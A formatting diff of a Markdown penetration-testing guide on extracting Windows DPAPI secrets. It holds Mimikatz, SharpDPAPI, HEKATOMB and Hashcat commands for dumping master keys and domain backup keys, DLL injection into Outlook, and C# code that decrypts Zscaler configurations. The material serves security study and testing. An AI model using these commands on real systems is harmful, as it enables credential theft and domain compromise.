@@ -1,7 +1,5 @@
 # DPAPI - Extracting Passwords
 
-
-
 ## What is DPAPI
 
 The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.
@@ -40,10 +38,10 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-```
+
 This is what a bunch of Master Keys of a user will looks like:
 
-![[<../../images/image (1121).png>|]]
+![[../../images/image (1121).png]]
 
 ### Machine/System key generation
 
@@ -83,21 +81,21 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-```
+
 - With local admin privileges, it's possible to **access the LSASS memory** to extract the DPAPI master keys of all the connected users and the SYSTEM key.
 
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-```
+
 - If the user has local admin privileges, they can access the **DPAPI_SYSTEM LSA secret** to decrypt the machine master keys:
 
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-```
+
 - If the password or hash NTLM of the user is known, you can **decrypt the master keys of the user directly**:
 
 ```bash
@@ -107,7 +105,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-```
+
 - If you are inside a session as the user, it's possible to ask the DC for the **backup key to decrypt the master keys using RPC**. If you are local admin and the user is logged in, you could **steal his session token** for this:
 
 ```bash
@@ -116,7 +114,6 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
-```
 ```
 
 ## List Vault
@@ -128,7 +125,7 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-```
+
 ## Access DPAPI Encrypted Data
 
 ### Find DPAPI Encrypted data
@@ -148,8 +145,8 @@ dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-```
-[[https://github.com/GhostPack/SharpDPAPI|**SharpDPAPI**]] can find DPAPI encrypted blobs in the file system, registry and B64 blobs:
+
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) can find DPAPI encrypted blobs in the file system, registry and B64 blobs:
 
 ```bash
 # Search blobs in the registry
@@ -165,8 +162,8 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-```
-Note that [[https://github.com/GhostPack/SharpDPAPI) (from the same repo|**SharpChrome**]] can be used to decrypt using DPAPI sensitive data like cookies.
+
+Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.
 
 ### Access keys and data
 
@@ -180,7 +177,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage 
 ```
-```
+
 - **Get credentials info** like the encrypted data and the guidMasterKey.
 
 ```bash
@@ -192,7 +189,7 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-```
+
 - **Access masterkeys**:
 
 Decrypt a masterkey of a user requesting the **domain backup key** using RPC:
@@ -203,7 +200,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-```
+
 The **SharpDPAPI** tool also supports these arguments for masterkey decryption (note how it's possible to use `/rpc` to get the domains backup key,  `/password` to use a plaintext password, or `/pvk` to specify a DPAPI domain private key file...):
 
 ```
@@ -217,7 +214,7 @@ The **SharpDPAPI** tool also supports these arguments for masterkey decryption (
 /server:SERVER          -   triage a remote server, assuming admin access
 /hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
 ```
-```
+
 - **Decrypt data using a masterkey**:
 
 ```bash
@@ -227,7 +224,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-```
+
 The **SharpDPAPI** tool also supports these arguments for `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (note how it's possible to use `/rpc` to get the domains backup key, `/password` to use a plaintext password, `/pvk` to specify a DPAPI domain private key file, `/unprotect` to use current users session...):
 
 ```
@@ -248,7 +245,7 @@ Targeting:
                         Note: must use with /pvk:KEY or /password:X
                         Note: not applicable to 'blob' or 'ps' commands
 ```
-```
+
 - Decrypt some data using **current user session**:
 
 ```bash
@@ -258,13 +255,13 @@ dpapi::blob /in:C:\path\to\encrypted\file /unprotect
 # SharpDPAPI
 SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
-```
+
 ---
 ### Handling Optional Entropy ("Third-party entropy")
 
 Some applications pass an additional **entropy** value to `CryptProtectData`. Without this value the blob cannot be decrypted, even if the correct masterkey is known. Obtaining the entropy is therefore essential when targeting credentials protected in this way (e.g. Microsoft Outlook, some VPN clients).
 
-[[https://github.com/SpecterOps/EntropyCapture) (2022|**EntropyCapture**]] is a user-mode DLL that hooks the DPAPI functions inside the target process and transparently records any optional entropy that is supplied. Running EntropyCapture in **DLL-injection** mode against processes like `outlook.exe` or `vpnclient.exe` will output a file mapping each entropy buffer to the calling process and blob. The captured entropy can later be supplied to **SharpDPAPI** (`/entropy:`) or **Mimikatz** (`/entropy:<file>`) in order to decrypt the data. 
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is a user-mode DLL that hooks the DPAPI functions inside the target process and transparently records any optional entropy that is supplied. Running EntropyCapture in **DLL-injection** mode against processes like `outlook.exe` or `vpnclient.exe` will output a file mapping each entropy buffer to the calling process and blob. The captured entropy can later be supplied to **SharpDPAPI** (`/entropy:`) or **Mimikatz** (`/entropy:<file>`) in order to decrypt the data. 
 
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
@@ -272,7 +269,6 @@ InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
 
 # Later decrypt a credential blob that required entropy
 SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
-```
 ```
 
 ### Cracking masterkeys offline (Hashcat & DPAPISnoop)
@@ -286,7 +282,7 @@ Microsoft introduced a **context 3** masterkey format starting with Windows 10 v
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-```
+
 The tool can also parse Credential and Vault blobs, decrypt them with cracked keys and export cleartext passwords.
 
 ### Access other machine data
@@ -297,12 +293,12 @@ In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
 ```
-```
+
 ## Other tools
 
 ### HEKATOMB
 
-[[https://github.com/Processus-Thief/HEKATOMB|**HEKATOMB**]] is a tool that automates the extraction of all users and computers from the LDAP directory and the extraction of domain controller backup key through RPC. The script will then resolve all computers IP address and perform a smbclient on all computers to retrieve all DPAPI blobs of all users and decrypt everything with domain backup key.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is a tool that automates the extraction of all users and computers from the LDAP directory and the extraction of domain controller backup key through RPC. The script will then resolve all computers IP address and perform a smbclient on all computers to retrieve all DPAPI blobs of all users and decrypt everything with domain backup key.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
@@ -310,7 +306,7 @@ With extracted from LDAP computers list you can find every sub network even if y
 
 ### DonPAPI 2.x (2024-05)
 
-[[https://github.com/login-securite/DonPAPI|**DonPAPI**]] can dump secrets protected by DPAPI automatically. The 2.x release introduced:
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) can dump secrets protected by DPAPI automatically. The 2.x release introduced:
 
 * Parallel collection of blobs from hundreds of hosts
 * Parsing of **context 3** masterkeys and automatic Hashcat cracking integration
@@ -319,7 +315,7 @@ With extracted from LDAP computers list you can find every sub network even if y
 
 ### DPAPISnoop
 
-[[https://github.com/Leftp/DPAPISnoop|**DPAPISnoop**]] is a C# parser for masterkey/credential/vault files that can output Hashcat/JtR formats and optionally invoke cracking automatically. It fully supports machine and user masterkey formats up to Windows 11 24H1. 
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is a C# parser for masterkey/credential/vault files that can output Hashcat/JtR formats and optionally invoke cracking automatically. It fully supports machine and user masterkey formats up to Windows 11 24H1. 
 
 ## Common detections
 
@@ -360,7 +356,7 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
     entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-```
+
 Because the secret is embedded in a DLL that can be read from disk, **any local attacker with SYSTEM rights can regenerate the entropy for any SID** and decrypt the blobs offline:
 
 ```csharp
@@ -368,21 +364,21 @@ byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-```
+
 Decryption yields the complete JSON configuration, including every **device posture check** and its expected value – information that is very valuable when attempting client-side bypasses.
 
 > TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). They can therefore be decrypted directly with `ProtectedData.Unprotect` once SYSTEM privileges are obtained.
 
 ## References
 
-- [[https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html|Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks]]
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
-- [[https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13|https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13]]
-- [[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c|https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c]]
-- [[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004|https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004]]
-- [[https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html|https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html]]
-- [[https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/|https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/]]
-- [[https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6|https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6]]
-- [[https://github.com/Leftp/DPAPISnoop|https://github.com/Leftp/DPAPISnoop]]
-- [[https://pypi.org/project/donpapi/2.0.0/|https://pypi.org/project/donpapi/2.0.0/]]
+- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
+- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
+- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
+- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
+- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
+- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
+- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
+- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
 
